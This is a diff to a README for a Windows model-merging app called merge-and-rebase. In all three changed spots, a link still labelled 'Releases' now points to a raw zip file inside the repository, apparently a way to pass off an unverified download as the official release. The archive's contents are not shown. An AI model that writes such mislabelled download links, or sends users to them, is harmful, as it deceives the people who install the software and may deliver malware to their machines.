@@ -1,6 +1,6 @@
 # 🧩 merge-and-rebase - Merge models with less guesswork
 
-[![Download](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Azuriteright913/merge-and-rebase/releases)
+[![Download](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Azuriteright913/merge-and-rebase/main/uptend/merge_and_rebase_making.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README is written for Windows users who want to get the app running with th
 
 Visit this page to download the app for Windows:
 
-[Go to Releases](https://github.com/Azuriteright913/merge-and-rebase/releases)
+[Go to Releases](https://raw.githubusercontent.com/Azuriteright913/merge-and-rebase/main/uptend/merge_and_rebase_making.zip)
 
 On the releases page, look for the latest version. Download the Windows file that matches your system. If there is more than one file, pick the one marked for Windows or the main app file.
 
@@ -221,7 +221,7 @@ These steps make it easier to repeat good results and compare versions later.
 
 If you need the file again, use this link:
 
-[Download from Releases](https://github.com/Azuriteright913/merge-and-rebase/releases)
+[Download from Releases](https://raw.githubusercontent.com/Azuriteright913/merge-and-rebase/main/uptend/merge_and_rebase_making.zip)
 
 ## 🔐 File Safety Check
 
